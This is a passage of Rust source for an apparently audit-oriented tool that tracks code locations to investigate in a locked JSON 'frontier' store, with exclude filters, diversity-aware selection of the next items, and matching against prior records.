use crate::now_iso_utc;
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::{BTreeMap, HashMap, HashSet};
use std::fs::{self, OpenOptions};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

static FRONTIER_TMP_SEQ: AtomicU64 = AtomicU64::new(0);

pub fn emit_err(as_json: bool, msg: &str) {
    if as_json {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({ "ok": false, "error": msg })).unwrap_or_default()
        );
    } else {
        eprintln!("{msg}");
    }
}

#[cfg(windows)]
mod win_replace {
    use std::path::Path;

    const MOVEFILE_REPLACE_EXISTING: u32 = 0x1;
    const MOVEFILE_WRITE_THROUGH: u32 = 0x8;

    #[link(name = "kernel32")]
    extern "system" {
        fn MoveFileExW(
            lp_existing_file_name: *const u16,
            lp_new_file_name: *const u16,
            dw_flags: u32,
        ) -> i32;
        fn GetLastError() -> u32;
    }

    pub fn replace_atomic(src: &Path, dst: &Path) -> Result<(), String> {
        let mut src_w: Vec<u16> = src
            .as_os_str()
            .to_string_lossy()
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let mut dst_w: Vec<u16> = dst
            .as_os_str()
            .to_string_lossy()
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let pid = std::process::id() as u64;
        for attempt in 0..20u64 {
            let ok = unsafe {
                MoveFileExW(
                    src_w.as_mut_ptr(),
                    dst_w.as_mut_ptr(),
                    MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH,
                )
            };
            if ok != 0 {
                return Ok(());
            }
            let err = unsafe { GetLastError() };
            // Jittered retry on transient ERROR_ACCESS_DENIED (5) or ERROR_SHARING_VIOLATION (32)
            if (err == 5 || err == 32) && attempt < 19 {
                let jitter = (pid.wrapping_mul(29) + attempt * 13) % 17;
                std::thread::sleep(std::time::Duration::from_millis(6 + attempt * 4 + jitter));
                continue;
            }
            return Err(format!("MoveFileExW failed (win32_err={err})"));
        }
        Err("MoveFileExW failed after retries".to_string())
    }
}

#[cfg(not(windows))]
mod win_replace {
    use std::path::Path;

    pub fn replace_atomic(src: &Path, dst: &Path) -> Result<(), String> {
        std::fs::rename(src, dst).map_err(|e| e.to_string())
    }
}

pub struct FrontierLockGuard {
    lock_path: PathBuf,
    token: String,
}

impl Drop for FrontierLockGuard {
    fn drop(&mut self) {
        let owns_lock = fs::read_to_string(&self.lock_path)
            .map(|cur| cur.trim() == self.token)
            .unwrap_or(false);
        if !owns_lock {
            return;
        }
        for attempt in 0..12u64 {
            match fs::remove_file(&self.lock_path) {
                Ok(()) => return,
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
                Err(_) if attempt < 11 => {
                    std::thread::sleep(Duration::from_millis(2 + attempt * 2));
                }
                Err(_) => return,
            }
        }
    }
}

fn parse_lock_pid(content: &str) -> Option<u32> {
    content
        .split_whitespace()
        .find_map(|tok| tok.strip_prefix("pid=")?.parse::<u32>().ok())
}

#[cfg(windows)]
fn is_pid_alive(pid: u32) -> bool {
    if pid == 0 {
        return false;
    }
    #[link(name = "kernel32")]
    extern "system" {
        fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut core::ffi::c_void;
        fn GetExitCodeProcess(handle: *mut core::ffi::c_void, code: *mut u32) -> i32;
        fn CloseHandle(handle: *mut core::ffi::c_void) -> i32;
    }
    const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
    const STILL_ACTIVE: u32 = 259;
    let h = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };
    if h.is_null() {
        return std::io::Error::last_os_error().raw_os_error() == Some(5);
    }
    let mut exit_code: u32 = 0;
    let ok = unsafe { GetExitCodeProcess(h, &mut exit_code) };
    unsafe {
        let _ = CloseHandle(h);
    }
    ok != 0 && exit_code == STILL_ACTIVE
}

#[cfg(unix)]
fn is_pid_alive(pid: u32) -> bool {
    if pid == 0 {
        return false;
    }
    extern "C" {
        fn kill(pid: i32, sig: i32) -> i32;
    }
    let rc = unsafe { kill(pid as i32, 0) };
    if rc == 0 {
        return true;
    }
    std::io::Error::last_os_error().raw_os_error() == Some(1)
}

#[cfg(not(any(windows, unix)))]
fn is_pid_alive(_pid: u32) -> bool {
    true
}

pub fn acquire_file_lock(store_path: &Path) -> Result<FrontierLockGuard, String> {
    if let Some(parent) = store_path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    let mut os = store_path.as_os_str().to_os_string();
    os.push(".lock");
    let lock_path = PathBuf::from(os);
    let deadline = Instant::now() + Duration::from_secs(10);
    let pid = std::process::id();
    let seq = FRONTIER_TMP_SEQ.fetch_add(1, Ordering::Relaxed);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let token = format!("pid={pid} seq={seq} ns={nanos}");
    let mut attempt = 0u64;
    loop {
        match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&lock_path)
        {
            Ok(mut f) => {
                let _ = writeln!(f, "{token}");
                let _ = f.flush();
                return Ok(FrontierLockGuard { lock_path, token });
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::AlreadyExists
                    || (cfg!(windows)
                        && (e.kind() == std::io::ErrorKind::PermissionDenied
                            || matches!(e.raw_os_error(), Some(5) | Some(32)))) =>
            {
                if let Ok(meta) = fs::metadata(&lock_path) {
                    if let Ok(mtime) = meta.modified() {
                        if let Ok(age) = SystemTime::now().duration_since(mtime) {
                            let dead_holder = age >= Duration::from_millis(500)
                                && fs::read_to_string(&lock_path)
                                    .ok()
                                    .and_then(|s| parse_lock_pid(&s))
                                    .is_some_and(|holder| holder != pid && !is_pid_alive(holder));
                            if dead_holder || age > Duration::from_secs(8) {
                                let _ = fs::remove_file(&lock_path);
                                continue;
                            }
                        }
                    }
                }
                if Instant::now() >= deadline {
                    return Err(format!(
                        "Timed out waiting for lock {}: {e}",
                        lock_path.display()
                    ));
                }
                attempt += 1;
                let jitter = ((pid as u64).wrapping_mul(31) + attempt * 7) % 7;
                std::thread::sleep(Duration::from_millis(2 + jitter));
            }
            Err(e) => return Err(e.to_string()),
        }
    }
}

struct TempFileGuard {
    path: PathBuf,
    armed: bool,
}

impl Drop for TempFileGuard {
    fn drop(&mut self) {
        if self.armed {
            let _ = fs::remove_file(&self.path);
        }
    }
}

fn prune_stale_tmp_files(store_path: &Path) {
    let (Some(parent), Some(fname)) = (
        store_path.parent(),
        store_path.file_name().and_then(|s| s.to_str()),
    ) else {
        return;
    };
    let prefix = format!("{fname}.");
    let my_pid = std::process::id();
    let Ok(rd) = fs::read_dir(parent) else {
        return;
    };
    for entry in rd.flatten() {
        let p = entry.path();
        let Some(name) = p.file_name().and_then(|s| s.to_str()) else {
            continue;
        };
        if !name.starts_with(&prefix) || !name.ends_with(".tmp") {
            continue;
        }
        let middle = &name[prefix.len()..name.len() - 4];
        let mut stale = false;
        if let Some(pid_tok) = middle.split('.').next() {
            if let Ok(pid) = pid_tok.parse::<u32>() {
                if pid != my_pid && !is_pid_alive(pid) {
                    stale = true;
                }
            }
        }
        if !stale {
            if let Ok(meta) = entry.metadata() {
                if let Ok(mtime) = meta.modified() {
                    if let Ok(age) = SystemTime::now().duration_since(mtime) {
                        if age > Duration::from_secs(60) {
                            stale = true;
                        }
                    }
                }
            }
        }
        if stale {
            let _ = fs::remove_file(&p);
        }
    }
}

pub fn atomic_write_text(dst: &Path, body: &str) -> Result<(), String> {
    if let Some(parent) = dst.parent() {
        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    let seq = FRONTIER_TMP_SEQ.fetch_add(1, Ordering::Relaxed);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let mut os = dst.as_os_str().to_os_string();
    os.push(format!(".{}.{nanos}.{seq}.tmp", std::process::id()));
    let tmp = PathBuf::from(os);
    let mut tmp_guard = TempFileGuard {
        path: tmp.clone(),
        armed: true,
    };
    {
        let mut f = fs::File::create(&tmp).map_err(|e| e.to_string())?;
        f.write_all(body.as_bytes()).map_err(|e| e.to_string())?;
        let _ = f.sync_all();
    }
    win_replace::replace_atomic(&tmp, dst)?;
    tmp_guard.armed = false;
    Ok(())
}

pub fn load_exclude_file(path: &Path) -> Result<Vec<String>, String> {
    let raw = fs::read_to_string(path).map_err(|e| e.to_string())?;
    Ok(raw
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(String::from)
        .collect())
}

fn glob_match_ci(pat: &str, text: &str) -> bool {
    let p: Vec<char> = pat.chars().collect();
    let t: Vec<char> = text.chars().collect();
    let (mut pi, mut ti) = (0usize, 0usize);
    let (mut star_pi, mut star_ti) = (None, 0usize);
    while ti < t.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == t[ti]) {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star_pi = Some(pi);
            pi += 1;
            star_ti = ti;
        } else if let Some(sp) = star_pi {
            pi = sp + 1;
            star_ti += 1;
            ti = star_ti;
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

pub struct FrontierExcludeMatcher {
    globs: Vec<String>,
    regexes: Vec<Regex>,
}

impl FrontierExcludeMatcher {
    pub fn compile(excludes: &[String]) -> Result<Self, String> {
        let mut globs = Vec::new();
        let mut regexes = Vec::new();
        for raw in excludes {
            let trimmed = raw.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            if let Some(re_src) = trimmed.strip_prefix("re:") {
                let re_pat = re_src.trim();
                let re = Regex::new(re_pat)
                    .map_err(|e| format!("invalid --exclude regex `{trimmed}`: {e}"))?;
                regexes.push(re);
            } else {
                globs.push(trimmed.replace('\\', "/").to_ascii_lowercase());
            }
        }
        Ok(Self { globs, regexes })
    }

    pub fn matches(&self, item: &FrontierItem) -> bool {
        if self.globs.is_empty() && self.regexes.is_empty() {
            return false;
        }
        let target_norm = item.target.replace('\\', "/");
        let target_low = target_norm.to_ascii_lowercase();
        let fname_low = target_low.rsplit('/').next().unwrap_or(&target_low);
        let module_norm = item.module.replace('\\', "/");
        let module_low = module_norm.to_ascii_lowercase();
        let symbol_low = item.symbol.to_ascii_lowercase();
        let axis_low = item.axis.to_ascii_lowercase();
        for pat in &self.globs {
            if pat.contains('*') || pat.contains('?') {
                if glob_match_ci(pat, &target_low)
                    || glob_match_ci(pat, fname_low)
                    || glob_match_ci(pat, &module_low)
                    || glob_match_ci(pat, &symbol_low)
                {
                    return true;
                }
            } else if target_low.contains(pat.as_str())
                || module_low.contains(pat.as_str())
                || symbol_low.contains(pat.as_str())
                || axis_low == pat.as_str()
            {
                return true;
            }
        }
        for re in &self.regexes {
            if re.is_match(&target_norm)
                || re.is_match(&module_norm)
                || re.is_match(&item.symbol)
                || re.is_match(&item.axis)
            {
                return true;
            }
        }
        false
    }
}

pub fn validate_excludes(excludes: &[String]) -> Result<(), String> {
    FrontierExcludeMatcher::compile(excludes).map(|_| ())
}

pub fn item_matches_exclude(item: &FrontierItem, excludes: &[String]) -> bool {
    FrontierExcludeMatcher::compile(excludes)
        .map(|m| m.matches(item))
        .unwrap_or(false)
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum FrontierStatus {
    Unvisited,
    Probed,
    Stopped,
    Confirmed,
    Deferred,
}

impl FrontierStatus {
    pub fn parse(raw: &str) -> Option<Self> {
        match raw.trim().to_ascii_lowercase().as_str() {
            "unvisited" | "todo" | "open" => Some(Self::Unvisited),
            "probed" | "visited" | "active" => Some(Self::Probed),
            "stopped" | "deadend" | "closed" | "skip" => Some(Self::Stopped),
            "confirmed" | "done" | "verified" => Some(Self::Confirmed),
            "deferred" | "later" => Some(Self::Deferred),
            _ => None,
        }
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Unvisited => "unvisited",
            Self::Probed => "probed",
            Self::Stopped => "stopped",
            Self::Confirmed => "confirmed",
            Self::Deferred => "deferred",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FrontierItem {
    pub id: String,
    pub axis: String,
    #[serde(default)]
    pub module: String,
    pub target: String,
    #[serde(default)]
    pub line: usize,
    #[serde(default)]
    pub symbol: String,
    #[serde(default)]
    pub snippet: String,
    #[serde(default)]
    pub guard_hint: String,
    #[serde(default = "default_score")]
    pub score: u32,
    pub status: FrontierStatus,
    #[serde(default)]
    pub reason: String,
    #[serde(default)]
    pub evidence_ref: String,
    #[serde(default)]
    pub updated_at: String,
}

fn default_score() -> u32 {
    80
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct FrontierState {
    #[serde(default)]
    pub updated_at: String,
    #[serde(default)]
    pub source_roots: Vec<String>,
    #[serde(default)]
    pub items: Vec<FrontierItem>,
}

fn fnv1a_hex(s: &str) -> String {
    let mut h: u64 = 0xcbf29ce484222325;
    for b in s.as_bytes() {
        h ^= *b as u64;
        h = h.wrapping_mul(0x100000001b3);
    }
    format!("{:08x}", (h ^ (h >> 32)) as u32)
}

fn clip(s: &str, max_chars: usize) -> String {
    s.trim().chars().take(max_chars).collect()
}

pub fn resolve_store_path(cwd: &Path, store: Option<&str>) -> PathBuf {
    if let Some(s) = store.map(str::trim).filter(|s| !s.is_empty()) {
        let p = PathBuf::from(s);
        return if p.is_absolute() { p } else { cwd.join(p) };
    }
    crate::baton_dir(cwd).join("frontier.json")
}

pub fn load_frontier_strict(store_path: &Path) -> Result<FrontierState, String> {
    if !store_path.exists() {
        return Ok(FrontierState::default());
    }
    let mut last_err = String::new();
    for attempt in 0..8u64 {
        match fs::read_to_string(store_path) {
            Ok(s) => match serde_json::from_str::<FrontierState>(&s) {
                Ok(parsed) => return Ok(parsed),
                Err(e) => {
                    last_err = format!("corrupt frontier store {}: {e}", store_path.display());
                    if attempt < 2 {
                        std::thread::sleep(Duration::from_millis(6 + attempt * 5));
                        continue;
                    }
                    return Err(last_err);
                }
            },
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                return Ok(FrontierState::default());
            }
            Err(e) => {
                last_err = format!("cannot read frontier store {}: {e}", store_path.display());
                if attempt < 7 {
                    std::thread::sleep(Duration::from_millis(8 + attempt * 5));
                }
            }
        }
    }
    Err(last_err)
}

pub fn load_frontier(store_path: &Path) -> FrontierState {
    load_frontier_strict(store_path).unwrap_or_default()
}

pub fn save_frontier_unlocked(store_path: &Path, state: &mut FrontierState) -> Result<(), String> {
    state.updated_at = now_iso_utc();
    let body = serde_json::to_string_pretty(state).map_err(|e| e.to_string())?;
    let res = atomic_write_text(store_path, &body);
    prune_stale_tmp_files(store_path);
    res
}

pub fn save_frontier(store_path: &Path, state: &mut FrontierState) -> Result<(), String> {
    let _lock = acquire_file_lock(store_path)?;
    save_frontier_unlocked(store_path, state)
}

fn upsert_item(state: &mut FrontierState, item: FrontierItem) -> bool {
    if let Some(existing) = state.items.iter_mut().find(|x| {
        x.id == item.id
            || (x.axis == item.axis && x.target == item.target && x.symbol == item.symbol)
    }) {
        // Preserve already-explored status/reason/evidence while refreshing structural metadata
        let mut changed = false;
        if item.line > 0 && existing.line != item.line {
            existing.line = item.line;
            changed = true;
        }
        if item.score > existing.score {
            existing.score = item.score;
            changed = true;
        }
        if !item.guard_hint.is_empty()
            && (existing.guard_hint.is_empty()
                || (existing.status == FrontierStatus::Unvisited
                    && existing.guard_hint != item.guard_hint))
        {
            existing.guard_hint = item.guard_hint;
            changed = true;
        }
        if !item.snippet.is_empty()
            && (existing.snippet.is_empty()
                || (existing.status == FrontierStatus::Unvisited
                    && existing.snippet != item.snippet))
        {
            existing.snippet = item.snippet;
            changed = true;
        }
        if existing.module.is_empty() && !item.module.is_empty() {
            existing.module = item.module;
            changed = true;
        }
        if changed {
            existing.updated_at = item.updated_at;
        }
        return false;
    }
    state.items.push(item);
    true
}

pub fn seed_from_json_str(state: &mut FrontierState, raw: &str) -> Result<(usize, usize), String> {
    let (added, skipped, _) = seed_from_json_str_with_excludes(state, raw, &[])?;
    Ok((added, skipped))
}

pub fn seed_from_json_str_with_excludes(
    state: &mut FrontierState,
    raw: &str,
    excludes: &[String],
) -> Result<(usize, usize, usize), String> {
    let matcher = FrontierExcludeMatcher::compile(excludes)?;
    let val: Value = serde_json::from_str(raw).map_err(|e| format!("invalid JSON: {e}"))?;
    if let Some(root) = val
        .get("root")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
    {
        if !state.source_roots.iter().any(|r| r == root) {
            state.source_roots.push(root.to_string());
        }
    }
    let arr = if let Some(items) = val.get("items").and_then(|v| v.as_array()) {
        items.clone()
    } else if let Some(items) = val.as_array() {
        items.clone()
    } else {
        return Err("expected JSON object with `items` array or top-level array".to_string());
    };
    let now = now_iso_utc();
    let mut added = 0usize;
    let mut skipped = 0usize;
    let mut filtered = 0usize;
    for row in arr {
        let axis = row
            .get("axis")
            .and_then(|v| v.as_str())
            .unwrap_or("general")
            .trim()
            .to_string();
        let target = row
            .get("target")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim()
            .to_string();
        if target.is_empty() {
            continue;
        }
        let symbol = row
            .get("symbol")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim()
            .to_string();
        let module = row
            .get("module")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim()
            .to_string();
        let line = row.get("line").and_then(|v| v.as_u64()).unwrap_or(0) as usize;
        let snippet = clip(
            row.get("snippet")
                .or_else(|| row.get("note"))
                .and_then(|v| v.as_str())
                .unwrap_or(""),
            180,
        );
        let guard_hint = row
            .get("guard_hint")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim()
            .to_string();
        let score = row.get("score").and_then(|v| v.as_u64()).unwrap_or(80) as u32;
        let id = row
            .get("id")
            .and_then(|v| v.as_str())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| {
                format!(
                    "{}:{}",
                    axis,
                    fnv1a_hex(&format!(
                        "{}|{}|{}",
                        axis,
                        target,
                        symbol.to_ascii_lowercase()
                    ))
                )
            });
        let item = FrontierItem {
            id,
            axis,
            module,
            target,
            line,
            symbol,
            snippet,
            guard_hint,
            score,
            status: FrontierStatus::Unvisited,
            reason: String::new(),
            evidence_ref: String::new(),
            updated_at: now.clone(),
        };
        if matcher.matches(&item) {
            filtered += 1;
            continue;
        }
        if upsert_item(state, item) {
            added += 1;
        } else {
            skipped += 1;
        }
    }
    Ok((added, skipped, filtered))
}

pub fn pick_next_diverse<'a>(
    state: &'a FrontierState,
    top_k: usize,
    exclude_axes: &[String],
) -> Vec<&'a FrontierItem> {
    let excluded: HashSet<String> = exclude_axes
        .iter()
        .map(|s| s.trim().to_ascii_lowercase())
        .filter(|s| !s.is_empty())
        .collect();

    // Count how many already-explored (probed/stopped/confirmed) entries exist per axis
    let mut explored_per_axis: HashMap<String, usize> = HashMap::new();
    for it in &state.items {
        if matches!(
            it.status,
            FrontierStatus::Probed | FrontierStatus::Stopped | FrontierStatus::Confirmed
        ) {
            *explored_per_axis.entry(it.axis.clone()).or_insert(0) += 1;
        }
    }

    let mut unvisited: Vec<&FrontierItem> = state
        .items
        .iter()
        .filter(|it| it.status == FrontierStatus::Unvisited)
        .collect();
    if unvisited.is_empty() {
        return Vec::new();
    }

    // Prefer non-excluded axes whenever any exist
    let has_non_excluded = unvisited
        .iter()
        .any(|it| !excluded.contains(&it.axis.to_ascii_lowercase()));

    unvisited.sort_by(|a, b| {
        let a_ex = if has_non_excluded && excluded.contains(&a.axis.to_ascii_lowercase()) {
            1u8
        } else {
            0u8
        };
        let b_ex = if has_non_excluded && excluded.contains(&b.axis.to_ascii_lowercase()) {
            1u8
        } else {
            0u8
        };
        let a_cov = *explored_per_axis.get(&a.axis).unwrap_or(&0);
        let b_cov = *explored_per_axis.get(&b.axis).unwrap_or(&0);
        a_ex.cmp(&b_ex)
            .then_with(|| a_cov.cmp(&b_cov))
            .then_with(|| b.score.cmp(&a.score))
            .then_with(|| a.axis.cmp(&b.axis))
            .then_with(|| a.target.cmp(&b.target))
    });

    // Diversify across axes & modules while strictly respecting exploration-count tiers
    // (0-explored axes ALWAYS precede already-explored axes, even if they share a module)
    let mut picked: Vec<&FrontierItem> = Vec::new();
    let mut used_ids: HashSet<&str> = HashSet::new();
    let mut used_axes: HashSet<&str> = HashSet::new();
    let mut used_modules: HashSet<&str> = HashSet::new();

    // Pass 1a: strictly unexplored axes (cov == 0) + distinct axis + distinct module
    for it in &unvisited {
        if picked.len() >= top_k {
            break;
        }
        let cov = *explored_per_axis.get(&it.axis).unwrap_or(&0);
        if cov == 0
            && !used_axes.contains(it.axis.as_str())
            && !used_modules.contains(it.module.as_str())
        {
            picked.push(*it);
            used_ids.insert(it.id.as_str());
            used_axes.insert(it.axis.as_str());
            if !it.module.is_empty() {
                used_modules.insert(it.module.as_str());
            }
        }
    }
    // Pass 1b: remaining strictly unexplored axes (cov == 0), distinct axis even if same module
    for it in &unvisited {
        if picked.len() >= top_k {
            break;
        }
        let cov = *explored_per_axis.get(&it.axis).unwrap_or(&0);
        if cov == 0 && !used_ids.contains(it.id.as_str()) && !used_axes.contains(it.axis.as_str()) {
            picked.push(*it);
            used_ids.insert(it.id.as_str());
            used_axes.insert(it.axis.as_str());
        }
    }
    // Pass 2: distinct axis + distinct module across all remaining tiers
    for it in &unvisited {
        if picked.len() >= top_k {
            break;
        }
        if !used_ids.contains(it.id.as_str())
            && !used_axes.contains(it.axis.as_str())
            && !used_modules.contains(it.module.as_str())
        {
            picked.push(*it);
            used_ids.insert(it.id.as_str());
            used_axes.insert(it.axis.as_str());
            if !it.module.is_empty() {
                used_modules.insert(it.module.as_str());
            }
        }
    }
    // Pass 3: distinct axis across remaining tiers
    for it in &unvisited {
        if picked.len() >= top_k {
            break;
        }
        if !used_ids.contains(it.id.as_str()) && !used_axes.contains(it.axis.as_str()) {
            picked.push(*it);
            used_ids.insert(it.id.as_str());
            used_axes.insert(it.axis.as_str());
        }
    }
    // Pass 4: fill remaining slots by rank
    for it in &unvisited {
        if picked.len() >= top_k {
            break;
        }
        if !used_ids.contains(it.id.as_str()) {
            picked.push(*it);
            used_ids.insert(it.id.as_str());
        }
    }
    picked
}

fn extract_distinct_tokens(text: &str) -> HashSet<String> {
    let mut out = HashSet::new();
    let generic: HashSet<&str> = [
        "src",
        "dist",
        "lib",
        "main",
        "index",
        "app",
        "file",
        "path",
        "json",
        "js",
        "ts",
        "py",
        "go",
        "rs",
        "java",
        "ext",
        "extension",
        "extensions",
        "node_modules",
        "resources",
        "package",
        "config",
        "server",
        "client",
        "service",
        "utils",
        "common",
        "core",
        "default",
        "require",
        "import",
        "const",
        "function",
        "return",
        "async",
        "await",
        "spawn",
        "exec",
        "admin",
        "token",
        "auth",
        "authn",
        "authz",
        "user",
        "users",
        "handler",
        "handle",
        "query",
        "route",
        "routes",
        "port",
        "ports",
        "http",
        "https",
        "params",
        "param",
        "listen",
        "listener",
        "control",
        "fastfail",
        "pipe",
        "pipes",
        "target",
        "request",
        "response",
        "error",
        "status",
        "check",
        "checked",
        "verified",
        "safe",
        "data",
        "info",
        "item",
        "items",
        "list",
        "create",
        "update",
        "delete",
        "read",
        "write",
        "post",
        "patch",
        "body",
        "header",
        "cookie",
        "role",
        "name",
        "value",
        "type",
        "mode",
        "code",
        "line",
        "test",
        "spec",
    ]
    .into_iter()
    .collect();
    let mut buf = String::new();
    for ch in text.chars() {
        if ch.is_ascii_alphanumeric() || ch == '_' || ch == '-' {
            buf.push(ch.to_ascii_lowercase());
        } else {
            if buf.len() >= 4 && !generic.contains(buf.as_str()) {
                out.insert(buf.clone());
            }
            buf.clear();
        }
    }
    if buf.len() >= 4 && !generic.contains(buf.as_str()) {
        out.insert(buf);
    }
    out
}

fn strip_contrast_and_dedup_lines(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut in_contrast_block = false;
    for raw_ln in text.lines() {
        let trim = raw_ln.trim();
        let low = trim.to_ascii_lowercase();
        if trim.is_empty() {
            continue;
        }
        if trim == "---" || trim == "===" {
            in_contrast_block = false;
            continue;
        }
        let is_heading = trim.starts_with('#');
        let is_contrast_header = [
            "contrast",
            "differentiate",
            "dedup",
            "non-duplicate",
            "adjacent",
            "exclusion",
            "去重",
            "对比",
            "区别",
            "邻近",
            "相邻",
            "排除",
        ]
        .iter()
        .any(|kw| low.contains(kw) || trim.contains(kw));
        if is_heading {
            in_contrast_block = is_contrast_header;
            continue;
        }
        if in_contrast_block {
            continue;
        }
        if low.len() < 8 {
            continue;
        }
        let is_contrast_line = [
            "not duplicate",
            "non-duplicate",
            "differs from",
            "distinct from",
            "not the same",
            "instead of",
            "rather than",
            "unlike ",
            "differentiate:",
            "excluded:",
            "false positive",
            "去重",
            "不撞",
            "区别",
            "不是同一条",
            "非重复",
        ]
        .iter()
        .any(|kw| low.contains(kw) || trim.contains(kw));
        if is_contrast_line {
            continue;
        }
        out.push(low);
    }
    out
}

fn extract_word_tokens_set(line_low: &str) -> HashSet<String> {
    let mut out = HashSet::new();
    let mut buf = String::new();
    for ch in line_low.chars() {
        if ch.is_ascii_alphanumeric() || ch == '_' || ch == '-' {
            buf.push(ch);
        } else {
            if buf.len() >= 4 {
                out.insert(buf.clone());
            }
            buf.clear();
        }
    }
    if buf.len() >= 4 {
        out.insert(buf);
    }
    out
}

fn contains_bounded_path(haystack_low: &str, needle_low: &str) -> bool {
    let hb = haystack_low.as_bytes();
    let nb = needle_low.as_bytes();
    if nb.is_empty() || hb.len() < nb.len() {
        return false;
    }
    for (idx, win) in hb.windows(nb.len()).enumerate() {
        if win == nb {
            let left_ok = idx == 0
                || !matches!(
                    hb[idx - 1],
                    b'a'..=b'z' | b'0'..=b'9' | b'_' | b'-' | b'/'
                );
            let r = idx + nb.len();
            let right_ok =
                r >= hb.len() || !matches!(hb[r], b'a'..=b'z' | b'0'..=b'9' | b'_' | b'-' | b'/');
            if left_ok && right_ok {
                return true;
            }
        }
    }
    false
}

pub fn sync_stopped_from_text(state: &mut FrontierState, source_label: &str, text: &str) -> usize {
    let lines = strip_contrast_and_dedup_lines(text);
    if lines.is_empty() {
        return 0;
    }
    let line_words: Vec<HashSet<String>> =
        lines.iter().map(|ln| extract_word_tokens_set(ln)).collect();
    let now = now_iso_utc();
    let mut marked = 0usize;
    for it in &mut state.items {
        if it.status != FrontierStatus::Unvisited {
            continue;
        }
        let target_low = it.target.to_ascii_lowercase().replace('\\', "/");
        let file_stem = Path::new(&target_low)
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("")
            .to_string();
        let sym_low = it.symbol.to_ascii_lowercase();
        let item_tokens =
            extract_distinct_tokens(&format!("{} {} {}", it.module, target_low, it.symbol));
        let stem_tokens = extract_distinct_tokens(&format!("{file_stem} {sym_low}"));

        let hit = lines.iter().zip(line_words.iter()).any(|(ln, words)| {
            // 1. Exact bounded target path match (or relative path + word-bounded symbol)
            if !target_low.is_empty()
                && target_low.len() >= 10
                && contains_bounded_path(ln, &target_low)
            {
                return true;
            }
            if target_low.contains('/')
                && target_low.len() >= 8
                && sym_low.len() >= 5
                && contains_bounded_path(ln, &target_low)
                && contains_ascii_word(ln, &sym_low)
            {
                return true;
            }
            // 2. High-precision word-bounded >=4 distinctive tokens + non-generic stem anchor
            if item_tokens.len() >= 4 && !stem_tokens.is_empty() {
                let hits = item_tokens
                    .iter()
                    .filter(|t| words.contains(t.as_str()))
                    .count();
                let has_stem = stem_tokens.iter().any(|st| words.contains(st.as_str()));
                if hits >= 4 && has_stem {
                    return true;
                }
            }
            false
        });

        if hit {
            it.status = FrontierStatus::Stopped;
            it.reason = format!("matched prior record ({})", clip(source_label, 48));
            it.updated_at = now.clone();
            marked += 1;
        }
    }
    marked
}

pub fn is_high_priority_guard(guard_hint: &str) -> bool {
    let low = guard_hint.trim().to_ascii_lowercase();
    if low.is_empty() {
        return false;
    }
    [
        "unguarded",
        "guard_after",
        "param_tainted",
        "none_nearby",
        "missing-origin-check",
        "no-origin-or-auth-check",
        "new_diff",
    ]
    .iter()
    .any(|kw| low.contains(kw))
}

fn contains_ascii_word(haystack_low: &str, needle: &str) -> bool {
    let bytes = haystack_low.as_bytes();
    let nb = needle.as_bytes();
    if nb.is_empty() || bytes.len() < nb.len() {
        return false;
    }
    for (idx, win) in bytes.windows(nb.len()).enumerate() {
        if win == nb {
            let left_ok = idx == 0 || !bytes[idx - 1].is_ascii_alphanumeric();
            let right_i = idx + nb.len();
            let right_ok = right_i >= bytes.len() || !bytes[right_i].is_ascii_alphanumeric();
            if left_ok && right_ok {
                return true;
            }
        }
    }
    false
}

fn has_line_citation(low: &str) -> bool {
    let b = low.as_bytes();
    for (i, &c) in b.iter().enumerate() {
        if c == b'l' && i + 1 < b.len() && b[i + 1].is_ascii_digit() {
            let left_ok = i == 0 || !b[i - 1].is_ascii_alphanumeric();
            if left_ok {
                return true;
            }
        }
        if low[i..].starts_with("line ")
            && low[i + 5..]
                .chars()
                .next()
                .is_some_and(|d| d.is_ascii_digit())
        {
            return true;
        }
    }
    false
}

pub fn classify_shallow_stop(item: &FrontierItem) -> Option<&'static str> {
    if item.status != FrontierStatus::Stopped {
        return None;
    }
    let r = item.reason.trim();
    let ev = item.evidence_ref.trim();
    let r_low = r.to_ascii_lowercase();
    let has_guard_proof = has_line_citation(&r_low)
        || [
            "guard",
            "check",
            "allowlist",
            "whitelist",
            "acl",
            "authz",
            "verified",
            "matched prior record",
            "paired control",
